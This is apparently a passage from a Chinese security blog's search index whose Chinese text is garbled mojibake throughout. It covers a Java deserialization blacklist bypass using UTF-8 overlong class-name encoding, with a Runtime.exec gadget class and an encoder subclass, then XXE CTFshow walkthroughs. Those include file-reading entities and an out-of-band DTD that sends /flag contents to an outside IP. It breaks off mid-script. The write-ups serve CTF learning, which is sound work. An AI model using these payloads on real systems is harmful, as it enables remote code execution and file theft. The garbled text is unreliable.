æ˜¯ç›¸åŒçš„ã€‚ å¯¹äºnå­—èŠ‚çš„ç¬¦å·ï¼ˆn &gt; 1ï¼‰ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚çš„å‰nä½éƒ½è®¾ä¸º1ï¼Œç¬¬n + 1ä½è®¾ä¸º0ï¼Œåé¢å­—èŠ‚çš„å‰ä¸¤ä½ä¸€å¾‹è®¾ä¸º10ã€‚å‰©ä¸‹çš„æ²¡æœ‰æåŠçš„äºŒè¿›åˆ¶ä½ï¼Œå…¨éƒ¨ä¸ºè¿™ä¸ªç¬¦å·çš„ Unicode ç ã€‚ åˆ†æå‡å¦‚æœ‰ä¸€ä¸ªæ¶æ„ç±»(å¦‚ä¸‹) 1234567891011121314151617181920212223package org.zIxyd;import java.io.IOException;import java.io.ObjectInputStream;import java.io.Serializable;public class Calc implements Serializable { private String cmd; public Calc() { } public Calc(String cmd) { this.cmd = cmd; } private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException { ois.defaultReadObject(); Runtime.getRuntime().exec(this.cmd); }} å¦‚æœå­˜åœ¨ä¸€å¤„ä»£ç ï¼Œå¯ä»¥ååºåˆ—åŒ–è¿™ä¸ªç±»ï¼Œå°†ä¼šå¯¼è‡´ä»»æ„å‘½ä»¤æ‰§è¡Œï¼› 12345678910111213141516171819202122232425262728293031323334353637383940package org.zIxyd;import java.io.*;public class ExpTest { public static void main(String[] args) throws IOException, ClassNotFoundException { Calc calc = new Calc(&quot;calc&quot;); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream); oos.writeObject(calc); String string = byteArrayOutputStream.toString(); System.out.println(string); BytetoHex(byteArrayOutputStream.toByteArray()); //è®¾ç½®é»‘åå• if (!string.contains(&quot;org.zIxyd.Calc&quot;)) { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray())); ois.readObject(); }else{ System.out.println(&quot;Hacker!!!&quot;); } } public static void BytetoHex(byte[] bytes){ StringBuilder hexString = new StringBuilder(); for (byte b : bytes) { hexString.append(String.format(&quot;%02X&quot;, b)); } System.out.println(hexString.toString()); }}/*è¾“å‡ºä¸ºï¼šï¿½ï¿½ \u0005sr \u000eorg.zIxyd.Calcï¿½ï¿½Tï¿½ï¿½H)|\u0002 \u0001L \u0003cmdt \u0012Ljava/lang/String;xpt \u0004calcACED00057372000E6F72672E7A497879642E43616C63BCF254BC9C48297C0200014C0003636D647400124C6A6176612F6C616E672F537472696E673B787074000463616C63Hacker!!!*/ ä½†æ˜¯è¿™å¤„ä»£ç æœ‰ä¸€å±‚waf:!string.contains(&quot;Calc&quot;); å¯ä»¥çœ‹åˆ°æ­£å¸¸åºåˆ—åŒ–æ—¶ï¼Œåºåˆ—åŒ–çš„æ•°æ®ä¼šåŒ…å«className; æ¥ä¸‹æ¥è°ƒè¯•ï¼Œçœ‹çœ‹ååºåˆ—åŒ–æ—¶æ€ä¹ˆæ‹¿åˆ°classNameçš„ï¼Œ1ueå¸ˆå‚…å·²ç»ç»™å‡ºäº†è°ƒç”¨æ ˆ: 12345ObjectStreamClass#readNonProxy(ObjectInputStream in) ObjectInputStream#readUTF() BlockDataInputStream#readUTF() ObjectInputStream#readUTFBody(long utflen) ObjectInputStream#readUTFSpan(StringBuilder sbuf, long utflen) æœ€åæ˜¯ç”±ObjectInputStreamç±»ä¸‹çš„readUTFSpanæ–¹æ³•ï¼› 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364private long readUTFSpan(StringBuilder sbuf, long utflen) throws IOException { int cpos = 0; int start = pos; int avail = Math.min(end - pos, CHAR_BUF_SIZE); // stop short of last char unless all of utf bytes in buffer int stop = pos + ((utflen &gt; avail) ? avail - 2 : (int) utflen); boolean outOfBounds = false; try { while (pos &lt; stop) { int b1, b2, b3; b1 = buf[pos++] &amp; 0xFF; switch (b1 &gt;&gt; 4) { case 0: case 1: case 2: case 3: case 4: case 5: case 6: case 7: // 1 byte format: 0xxxxxxx cbuf[cpos++] = (char) b1; break; case 12: case 13: // 2 byte format: 110xxxxx 10xxxxxx b2 = buf[pos++]; if ((b2 &amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 &amp; 0x1F) &lt;&lt; 6) | ((b2 &amp; 0x3F) &lt;&lt; 0)); break; case 14: // 3 byte format: 1110xxxx 10xxxxxx 10xxxxxx b3 = buf[pos + 1]; b2 = buf[pos + 0]; pos += 2; if ((b2 &amp; 0xC0) != 0x80 || (b3 &amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 &amp; 0x0F) &lt;&lt; 12) | ((b2 &amp; 0x3F) &lt;&lt; 6) | ((b3 &amp; 0x3F) &lt;&lt; 0)); break; default: // 10xx xxxx, 1111 xxxx throw new UTFDataFormatException(); } } } catch (ArrayIndexOutOfBoundsException ex) { outOfBounds = true; } finally { if (outOfBounds || (pos - start) &gt; utflen) { pos = start + (int) utflen; throw new UTFDataFormatException(); } } sbuf.append(cbuf, 0, cpos); return pos - start; } å…¶ä¸­é€šè¿‡switch (b1 &gt;&gt; 4)æ¥åˆ¤æ–­æ˜¯:å¤šå°‘ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå­—ç¬¦ï¼› æˆ‘è¿™é‡Œçš„ClassNameä¸ºï¼šorg.zIxyd.Calcç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ºo;å…¶16è¿›åˆ¶ä¸º 0x6fï¼› æ ¹æ®ä»£ç é€»è¾‘ï¼Œä¼šèµ°åˆ°å¤„ç†ä¸€ä¸ªå­—èŠ‚å¯¹åº”ä¸€ä¸ªå­—ç¬¦çš„åœ°æ–¹;å³è¿”å›äº† o çš„char 123case 7: // 1 byte format: 0xxxxxxx cbuf[cpos++] = (char) b1; break; ä½†éš¾é“åªæœ‰ 1 byte format: 0xxxxxxx æ—¶æ‰èƒ½è·å– o å­—ç¬¦ä¸²å—ï¼Œå…¶å®ä¸ç„¶ï¼Œå¤„ç†ä¿©ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå­—ç¬¦çš„é€»è¾‘å’Œå¤„ç†ä¸‰ä¸ªå­—èŠ‚çš„é€»è¾‘éƒ½å¯ä»¥è¿”å›ï¼› 123456789case 12:case 13: // 2 byte format: 110xxxxx 10xxxxxx b2 = buf[pos++]; if ((b2 &amp; 0xC0) != 0x80) { throw new UTFDataFormatException(); } cbuf[cpos++] = (char) (((b1 &amp; 0x1F) &lt;&lt; 6) | ((b2 &amp; 0x3F) &lt;&lt; 0)); break; è¿™é‡Œä»¥ä¸¤ä¸ªå­—èŠ‚çš„ä¸ºåˆ—ï¼›ç”¨pythonå®ç°:è¾“å‡ºä¸€ä¸ªå­—æ¯å¯¹åº”çš„ä¸¤ä¸ªå­—èŠ‚å€¼ 12345678910111213import stringb1 = int(&quot;11000000&quot;, 2)while (b1 &lt;= int(&quot;11011111&quot;, 2)): b2 = int(&quot;10000000&quot;, 2) while (b2 &lt;= int(&quot;10111111&quot;, 2)): cha = chr(((b1 &amp; 0x1F) &lt;&lt; 6) | ((b2 &amp; 0x3F) &lt;&lt; 0)) if (cha in string.ascii_lowercase): print(cha + &quot; &quot; + str(hex(b1)) + &quot; : &quot; + str(hex(b2))) if (cha in string.ascii_uppercase): print(cha + &quot; &quot; + str(hex(b1)) + &quot; : &quot; + str(hex(b2))) b2 = b2 + 1 b1 = b1 + 1 å…¶ä¸­å¯ä»¥å¾—çŸ¥o 0xc1 : 0xaf ç°åœ¨å°†ä¹‹å‰é‚£æ®µæ¶æ„çš„åºåˆ—åŒ–åå…­è¿›åˆ¶æ•°æ®ï¼Œå°†6Fæ”¹æˆC1AFï¼Œå†æ¬¡ååºåˆ—åŒ–è¿™æ®µæ•°æ®ï¼› è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œå› ä¸ºClassNameå¤šäº†ä¸€ä¸ªå­—èŠ‚ï¼Œå¯¹åº”çš„é•¿åº¦ä¹Ÿè¦æ”¹å˜ï¼› 123456789101112131415161718192021222324252627282930313233343536373839404142package org.zIxyd;import javax.xml.bind.DatatypeConverter;import java.io.ByteArrayInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class CalcTest { public static void main(String[] args) throws IOException, ClassNotFoundException { String hexString = &quot;ACED00057372000FC1AF72672E7A497879642E43616C63BCF254BC9C48297C0200014C0003636D647400124C6A6176612F6C616E672F537472696E673B787074000463616C63&quot;; byte[] byteArray = DatatypeConverter.parseHexBinary(hexString); byte[] bytes = hexStringToByteArray(hexString); String text = new String(bytes); System.out.println(&quot;è½¬æ¢åçš„å­—ç¬¦ä¸²ä¸ºï¼š&quot; + text); if (!text.contains(&quot;org.zIxyd.Calc&quot;)) { ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(byteArray)); ois.readObject(); }else{ System.out.println(&quot;Hacker!!!&quot;); } } public static byte[] hexStringToByteArray(String hexString) { int len = hexString.length(); byte[] data = new byte[len / 2]; for (int i = 0; i &lt; len; i += 2) { data[i / 2] = (byte) ((Character.digit(hexString.charAt(i), 16) &lt;&lt; 4) + Character.digit(hexString.charAt(i+1), 16)); } return data; }}/*è¾“å‡ºä¸ºï¼šè½¬æ¢åçš„å­—ç¬¦ä¸²ä¸ºï¼šï¿½ï¿½ \u0005sr \u000fï¿½ï¿½rg.zIxyd.Calcï¿½ï¿½Tï¿½ï¿½H)|\u0002 \u0001L \u0003cmdt \u0012Ljava/lang/String;xpt \u0004calc*/ å¯ä»¥çœ‹åˆ°oå­—ç¬¦å·²ç»è¢«æ··æ·†äº†ï¼›æ‰€ä»¥ç»•è¿‡äº†é»‘åå• Toolsæ¼æ´åˆ†æå®Œäº†ï¼›ä½†æ˜¯å¯ä»¥æƒ³åˆ°æ‰‹åŠ¨ä¿®æ”¹ClassNameçš„å­—èŠ‚å¤ªè¿‡éº»çƒ¦ï¼›å¸ˆå‚…ä»¬ç”¨çš„åŠæ³•éƒ½æ˜¯é‡å†™writeClassDescriptoræ–¹æ³•ï¼Œå†åŠ ä¸Šå°†ç±»åOverlong Encodingçš„é€»è¾‘(å…·ä½“æ€è·¯å¯ä»¥çœ‹çœ‹lzstarå¸ˆå‚…) ç„¶åçœ‹äº†ä¸€ä¸‹è¯„è®ºï¼Œè¯´é‡å†™writeUTFç›¸æ¯”ä¹‹ä¸‹ç®€å•ä¸€ç‚¹(ç¡®å®ç®€å•ä¸å°‘);æ‰€ä»¥å°±æœ‰äº†ä¸‹é¢è¿™æ®µä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import java.io.IOException;import java.io.ObjectOutputStream;import java.io.OutputStream;import java.util.HashMap;public class OverlongExp extends ObjectOutputStream { private static HashMap&lt;Character, int[]&gt; map; static { map = new HashMap&lt;&gt;(); map.put('.', new int[]{0xc0, 0xae}); map.put(';', new int[]{0xc0, 0xbb}); map.put('$', new int[]{0xc0, 0xa4}); map.put('[', new int[]{0xc1, 0x9b}); map.put(']', new int[]{0xc1, 0x9d}); map.put('_', new int[]{0xc1, 0x9f}); map.put('a', new int[]{0xc1, 0xa1}); map.put('b', new int[]{0xc1, 0xa2}); map.put('c', new int[]{0xc1, 0xa3}); map.put('d', new int[]{0xc1, 0xa4}); map.put('e', new int[]{0xc1, 0xa5}); map.put('f', new int[]{0xc1, 0xa6}); map.put('g', new int[]{0xc1, 0xa7}); map.put('h', new int[]{0xc1, 0xa8}); map.put('i', new int[]{0xc1, 0xa9}); map.put('j', new int[]{0xc1, 0xaa}); map.put('k', new int[]{0xc1, 0xab}); map.put('l', new int[]{0xc1, 0xac}); map.put('m', new int[]{0xc1, 0xad}); map.put('n', new int[]{0xc1, 0xae}); map.put('o', new int[]{0xc1, 0xaf}); map.put('p', new int[]{0xc1, 0xb0}); map.put('q', new int[]{0xc1, 0xb1}); map.put('r', new int[]{0xc1, 0xb2}); map.put('s', new int[]{0xc1, 0xb3}); map.put('t', new int[]{0xc1, 0xb4}); map.put('u', new int[]{0xc1, 0xb5}); map.put('v', new int[]{0xc1, 0xb6}); map.put('w', new int[]{0xc1, 0xb7}); map.put('x', new int[]{0xc1, 0xb8}); map.put('y', new int[]{0xc1, 0xb9}); map.put('z', new int[]{0xc1, 0xba}); map.put('A', new int[]{0xc1, 0x81}); map.put('B', new int[]{0xc1, 0x82}); map.put('C', new int[]{0xc1, 0x83}); map.put('D', new int[]{0xc1, 0x84}); map.put('E', new int[]{0xc1, 0x85}); map.put('F', new int[]{0xc1, 0x86}); map.put('G', new int[]{0xc1, 0x87}); map.put('H', new int[]{0xc1, 0x88}); map.put('I', new int[]{0xc1, 0x89}); map.put('J', new int[]{0xc1, 0x8a}); map.put('K', new int[]{0xc1, 0x8b}); map.put('L', new int[]{0xc1, 0x8c}); map.put('M', new int[]{0xc1, 0x8d}); map.put('N', new int[]{0xc1, 0x8e}); map.put('O', new int[]{0xc1, 0x8f}); map.put('P', new int[]{0xc1, 0x90}); map.put('Q', new int[]{0xc1, 0x91}); map.put('R', new int[]{0xc1, 0x92}); map.put('S', new int[]{0xc1, 0x93}); map.put('T', new int[]{0xc1, 0x94}); map.put('U', new int[]{0xc1, 0x95}); map.put('V', new int[]{0xc1, 0x96}); map.put('W', new int[]{0xc1, 0x97}); map.put('X', new int[]{0xc1, 0x98}); map.put('Y', new int[]{0xc1, 0x99}); map.put('Z', new int[]{0xc1, 0x9a}); } public OverlongExp(OutputStream out) throws IOException { super(out); } public void writeUTF(String str) throws IOException { writeShort(str.length() * 2); for (int i = 0; i &lt; str.length(); i++) { int[] bs = map.get(str.charAt(i)); super.write(bs[0]); super.write(bs[1]); } }} å¯¹æ¯”ä¸€ä¸‹æ··æ·†ä¹‹å‰å’Œæ··æ·†ä¹‹åçš„CC5 æ€»ç»“Overlong Encodingå¯¼è‡´çš„å®‰å…¨é—®é¢˜ä¸æ­¢å±€é™äºjavaååºåˆ—åŒ–ä¸­ï¼Œä¾‹å¦‚ï¼šGlassFishåœ¨è§£ç URLæ—¶ï¼Œæ²¡æœ‰è€ƒè™‘UTF-8 Overlong Encodingæ”»å‡»ï¼Œå¯¼è‡´å°†%c0%aeè§£æä¸ºASCCIIå­—ç¬¦çš„.ï¼ˆç‚¹ï¼‰ã€‚åˆ©ç”¨%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/æ¥å‘ä¸Šè·³è½¬ï¼Œè¾¾åˆ°ç›®å½•ç©¿è¶Šã€ä»»æ„æ–‡ä»¶è¯»å–çš„æ•ˆæœã€‚ æœ€åè´´ä¸€ä¸‹pç¥å†™äº†ä¸€ä¸ªç®€å•çš„Pythonå‡½æ•°ï¼Œç”¨äºå°†ä¸€ä¸ªASCIIå­—ç¬¦ä¸²è½¬æ¢æˆOverlong Encodingçš„UTF-8ç¼–ç ï¼š 1234567891011121314151617def convert_int(i: int) -&gt; bytes: b1 = ((i &gt;&gt; 6) &amp; 0b11111) | 0b11000000 b2 = (i &amp; 0b111111) | 0b10000000 return bytes([b1, b2])def convert_str(s: str) -&gt; bytes: bs = b'' for ch in s.encode(): bs += convert_int(ch) return bsif __name__ == '__main__': print(convert_str('.')) # b'\\xc0\\xae' print(convert_str('org.example.Evil'))","link":"/2024/03/19/UTF-8%20Overlong%20Encoding/"},{"title":"XXEæ¼æ´","text":"ä»€ä¹ˆæ˜¯xxeæ¼æ´ï¼ŸXXEå…¨ç§°æ˜¯XML External Entity Injectionï¼Œå³å¤–éƒ¨å®ä½“æ³¨å…¥ã€‚XXEæ˜¯é’ˆå¯¹åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥ç±»å‹çš„æ”»å‡»ã€‚å½“åŒ…å«å¯¹å¤–éƒ¨å®ä½“çš„å¼•ç”¨çš„ XMLè¾“å…¥è¢«å¼±é…ç½®çš„ XML è§£æå™¨å¤„ç†æ—¶ï¼Œå°±ä¼šå‘ç”Ÿè¿™ç§æ”»å‡»ã€‚è¿™ç§æ”»å‡»å¯èƒ½å¯¼è‡´æœºå¯†æ•°æ®æ³„éœ²ã€æ‹’ç»æœåŠ¡ã€æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ã€‚ ä»€ä¹ˆæ˜¯XML? XML æŒ‡å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼ˆEXtensible Markup Languageï¼‰ã€‚ XML æ˜¯ä¸€ç§å¾ˆåƒHTMLçš„æ ‡è®°è¯­è¨€ã€‚ XML çš„è®¾è®¡å®—æ—¨æ˜¯ä¼ è¾“æ•°æ®ï¼Œè€Œä¸æ˜¯æ˜¾ç¤ºæ•°æ®ã€‚ XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ã€‚æ‚¨éœ€è¦è‡ªè¡Œå®šä¹‰æ ‡ç­¾ã€‚ XML è¢«è®¾è®¡ä¸ºå…·æœ‰è‡ªæˆ‘æè¿°æ€§ã€‚ XMLå®åˆ—XML æ–‡æ¡£ç¬¬ä¸€è¡Œä»¥ XML å£°æ˜å¼€å§‹ï¼Œç”¨æ¥è¡¨è¿°æ–‡æ¡£çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚ï¼š 1&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; æ ‡ç­¾å¿…é¡»æˆå¯¹å‡ºç°ï¼Œæœ‰å¼€å§‹æ ‡ç­¾å°±éœ€è¦æœ‰ç»“æŸæ ‡ç­¾ï¼Œ XML æ ‡ç­¾æ²¡æœ‰è¢«é¢„å®šä¹‰ï¼Œé€šè¿‡ XML æ‚¨å¯ä»¥å‘æ˜è‡ªå·±çš„æ ‡ç­¾ï¼Œåˆ—å¦‚ä¸‹é¢çš„ â€œsiteâ€,â€nameâ€,â€urlâ€,â€descâ€éƒ½æ˜¯è‡ªå®šä¹‰çš„æ ‡ç­¾ XML å¿…é¡»åŒ…å«æ ¹å…ƒç´ ï¼Œå®ƒæ˜¯æ‰€æœ‰å…¶ä»–å…ƒç´ çš„çˆ¶å…ƒç´ ã€‚ä¸‹é¢æ¡ˆä¾‹ä¸­çš„æ ¹å…ƒç´ å°±æ˜¯â€œsiteâ€ 123456&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;site&gt; &lt;name&gt;zIxyd&lt;/name&gt; &lt;url&gt;https://zixyd.github.io&lt;/url&gt; &lt;desc&gt;Blog&lt;/desc&gt;&lt;/site&gt; ä»€ä¹ˆæ˜¯DTDï¼ŸDocument Type Definition æ–‡æ¡£ç±»å‹å®šä¹‰ DTDæ–‡ä»¶ä¸€èˆ¬å’ŒXMLæ–‡ä»¶é…åˆä½¿ç”¨ï¼Œä¸»è¦æ˜¯ä¸ºäº†çº¦æŸXMLæ–‡ä»¶ã€‚ XMLæ–‡ä»¶å¼•å…¥DTDæ–‡ä»¶ï¼Œè¿™æ ·XMLå¯ä»¥è‡ªå®šä¹‰æ ‡ç­¾ï¼Œä½†åˆå—åˆ°DTDæ–‡ä»¶çš„çº¦æŸ åŸºæœ¬è¯­æ³•ï¼š 1&lt;!ELEMENT å…ƒç´ å ç±»å‹&gt; DTDå®åˆ—ç¼–å†™ä¸€ä¸ªåä¸ºmyClass.dtdçš„dtdæ–‡ä»¶ 12345&lt;!ELEMENT ç­çº§ (å­¦ç”Ÿ+)&gt;&lt;!ELEMENT å­¦ç”Ÿ (åå­—,å¹´é¾„,ä»‹ç»)&gt;&lt;!ELEMENT åå­— (#PCDATA)&gt;&lt;!ELEMENT å¹´é¾„ (#PCDATA)&gt;&lt;!ELEMENT ä»‹ç» (#PCDATA)&gt; ç¼–å†™ä¸€ä¸ªxmlæ–‡ä»¶å¹¶å¼•å…¥dtdæ–‡ä»¶ 123456789101112131415&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!--å¼•å…¥dtdæ–‡ä»¶ï¼Œçº¦æŸè¿™ä¸ªxml--&gt;&lt;!DOCTYPE ç­çº§ SYSTEM &quot;myClass.dtd&quot;&gt;&lt;ç­çº§&gt; &lt;å­¦ç”Ÿ&gt; &lt;åå­—&gt;å‘¨å°æ˜Ÿ&lt;/åå­—&gt; &lt;å¹´é¾„&gt;23&lt;/å¹´é¾„&gt; &lt;ä»‹ç»&gt;å­¦ä¹ åˆ»è‹¦&lt;/ä»‹ç»&gt; &lt;/å­¦ç”Ÿ&gt; &lt;å­¦ç”Ÿ&gt; &lt;åå­—&gt;æ—æ™“&lt;/åå­—&gt; &lt;å¹´é¾„&gt;25&lt;/å¹´é¾„&gt; &lt;ä»‹ç»&gt;æ˜¯ä¸€ä¸ªå¥½å­¦ç”Ÿ&lt;/ä»‹ç»&gt; &lt;/å­¦ç”Ÿ&gt; &lt;/ç­çº§&gt; å¼•å…¥ä¸­å†™çš„ï¼šSYSTEMï¼Œè¡¨ç¤ºå½“å‰çš„DTDæ–‡ä»¶æ˜¯æœ¬åœ°çš„ å¦‚æœå†™çš„æ˜¯PUBLICï¼Œåˆ™è¡¨ç¤ºå¼•å…¥çš„DTDæ–‡ä»¶æ˜¯æ¥è‡ªäºç½‘ç»œçš„. DTDæ–‡æ¡£çš„å£°æ˜åŠå¼•ç”¨1.å†…éƒ¨DTDæ–‡æ¡£1&lt;!DOCTYPE æ ¹å…ƒç´  [å®šä¹‰å†…å®¹]&gt; 2.å¤–éƒ¨DTDæ–‡æ¡£å¼•å…¥å¤–éƒ¨çš„DTDæ–‡æ¡£åˆ†ä¸ºä¸¤ç§ï¼š ï¼ˆ1ï¼‰å½“å¼•ç”¨çš„DTDæ–‡ä»¶æ˜¯æœ¬åœ°æ–‡ä»¶çš„æ—¶å€™ï¼Œç”¨SYSTEMæ ‡è¯†ï¼Œå¹¶å†™ä¸Šâ€DTDçš„æ–‡ä»¶è·¯å¾„â€ï¼Œå¦‚ä¸‹ï¼š 1&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;DTDæ–‡ä»¶è·¯å¾„&quot;&gt; ï¼ˆ2ï¼‰å¦‚æœå¼•ç”¨çš„DTDæ–‡ä»¶æ˜¯ä¸€ä¸ªå…¬å…±çš„æ–‡ä»¶æ—¶ï¼Œé‡‡ç”¨PUBLICæ ‡è¯†ï¼Œå¦‚ä¸‹æ–¹å¼ï¼š 1&lt;!DOCTYPE æ ¹å…ƒç´  PUBLIC &quot;DTDåç§°&quot; &quot;DTDæ–‡ä»¶çš„URL&quot;&gt; è¡¥å……å…³é”®(ENTITY)ENTITYå±æ€§ï¼šå®ä½“ç”¨äºä¸ºä¸€æ®µå†…å®¹åˆ›å»ºä¸€ä¸ªåˆ«åï¼Œä»¥ååœ¨XMLæ–‡æ¡£ä¸­å°±å¯ä»¥ä½¿ç”¨åˆ«åå¼•ç”¨è¿™æ®µå†…å®¹äº†ã€‚ 1,å¼•ç”¨å®ä½“ 1&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt; ä¸¾ä¾‹ 123&lt;!ENTITY copyright &quot;I am a programmer&quot;&gt;....&amp;copyright; 2,å‚æ•°å®ä½“ 1&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“å†…å®¹&quot;&gt; ä¸¾ä¾‹ 1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!ELEMENT person (name,addr,tel,br,email)&gt;&lt;!ENTITY %name &quot;(#PCDATA)&quot;&gt;&lt;!ELEMENT addr %name;&gt;&lt;!ELEMENT tel %name;&gt;&lt;!ELEMENT br EMPTY&gt;&lt;!ELEMENT email %name;&gt; CTFSHOW_XMLweb373(å…¥é—¨xml)123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); $creds = simplexml_import_dom($dom); $ctfshow = $creds-&gt;ctfshow; echo $ctfshow;}highlight_file(__FILE__); 1, libxml_disable_entity_loaderå‡½æ•°å¯ä»¥åŠ è½½å¤–éƒ¨å®ä½“ 1å¯é€‰ã€‚ç¦ç”¨ (TRUE) æˆ–å¯ç”¨ (FALSE) libxml æ‰©å±•ä»¥åŠ è½½å¤–éƒ¨å®ä½“ã€‚ é»˜è®¤ä¸ºçœŸ 2, **file_get_contents(â€˜php://inputâ€™)**æ¥å—POSTæ•°æ® 3, simplexml_import_dom å‡½æ•°æŠŠ DOM èŠ‚ç‚¹è½¬æ¢ä¸º SimpleXMLElement å¯¹è±¡ 1234567&lt;?php$dom = new domDocument();$dom-&gt;loadXML('&lt;note&gt;&lt;from&gt;John&lt;/from&gt;&lt;/note&gt;');$xml = simplexml_import_dom($dom);echo $xml-&gt;from;?&gt; //è¾“å‡ºJohn payload 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE any [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;anything&gt; &lt;ctfshow&gt; &amp;xxe; &lt;/ctfshow&gt;&lt;/anything&gt; web374 (æ— å›æ˜¾)123456789&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); åˆ©ç”¨ENTITYä¸­çš„å‚æ•°å®ä½“ ä¸ºåŒºåˆ†åµŒå¥—å®ä½“å’Œå®ä½“ä¹‹é—´çš„å…³ç³»ï¼Œå¯ä»¥é€šè¿‡å•åŒå¼•å·æ¥é—´éš”å¼€ï¼Œå¼•å·ä¸­åµŒå¥—ä¸€ä¸ªå‚æ•°å®ä½“ï¼Œå…¶%å·éœ€è¦å†™æˆï¼š%ä¹Ÿå¯å†™ä¸º16è¿›åˆ¶çš„% åªè¦æ˜ç™½å‚æ•°å®ä½“ï¼Œpayloadä¸å°±éš¾ç†è§£ å…ˆåœ¨vpsä¸Šåˆ›å»ºä¸€ä¸ªdtdæ–‡ä»¶ 1234&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt; &lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#x25; send SYSTEM 'http://81.71.13.76:5050/%file;'&gt;&quot;&gt; å†vpsåˆ©ç”¨ncç›‘å¬ç«¯å£ 5050ï¼Œå†å‘é€xmlæ•°æ® 12345&lt;!DOCTYPE note[&lt;!ENTITY % remote SYSTEM &quot;http://81.71.13.76:5656/xxe.dtd&quot;&gt;%remote;%int;%send;]&gt; web375 -web376(æ— å›æ˜¾,è¿‡æ»¤äº†&lt;?xml version=â€1.0â€) XMLçš„å£°æ˜æ˜¯å¯ä»¥çœç•¥çš„ï¼Œæ‰€ä»¥å’Œ374æ˜¯ä¸€æ ·çš„è§£æ³• 12345678910111213&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;/', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); web377(æ— å›æ˜¾,è¿‡æ»¤äº†&lt;?xml version=â€1.0â€å’Œâ€œhttpâ€) 123456789101112&lt;?phperror_reporting(0);libxml_disable_entity_loader(false);$xmlfile = file_get_contents('php://input');if(preg_match('/&lt;\\?xml version=&quot;1\\.0&quot;|http/i', $xmlfile)){ die('error');}if(isset($xmlfile)){ $dom = new DOMDocument(); $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);}highlight_file(__FILE__); ä¸€ä¸ªxmlæ–‡æ¡£ä¸ä»…å¯ä»¥ç”¨UTF-8ç¼–ç ï¼Œä¹Ÿå¯ä»¥ç”¨UTF-16(ä¸¤ä¸ªå˜ä½“ - BEå’ŒLE)ã€UTF-32(å››ä¸ªå˜ä½“ - BEã€LEã€2143ã€3412)å’ŒEBCDICç¼–ç ã€‚ åœ¨è¿™ç§ç¼–ç çš„å¸®åŠ©ä¸‹ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥å¾ˆå®¹æ˜“åœ°ç»•è¿‡WAFï¼Œå› ä¸ºåœ¨è¿™ç§ç±»å‹çš„WAFä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼é€šå¸¸ä»…é…ç½®ä¸ºå•å­—ç¬¦é›†ã€‚ å¤–æ¥ç¼–ç ä¹Ÿå¯ç”¨äºç»•è¿‡æˆç†Ÿçš„WAFï¼Œå› ä¸ºå®ƒä»¬å¹¶ä¸æ€»æ˜¯èƒ½å¤Ÿå¤„ç†ä¸Šé¢åˆ—å‡ºçš„æ‰€æœ‰ç¼–ç ã€‚ä¾‹å¦‚ï¼Œlibxml2è§£æå™¨åªæ”¯æŒä¸€ç§ç±»å‹çš„utf-32 - utf-32BEï¼Œç‰¹åˆ«æ˜¯ä¸æ”¯æŒBOMã€‚ æ„æ€æ˜¯å¯ä»¥å¯¹xmlæ–‡æ¡£UTF-16ç¼–ç  123456789import requestsurl = 'http://f20c0eb6-2aea-496b-8411-94f78f0ae0a4.challenge.ctf.show/'data = '''&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/flag&quot;&gt;&lt;!ENTITY % aaa SYSTEM 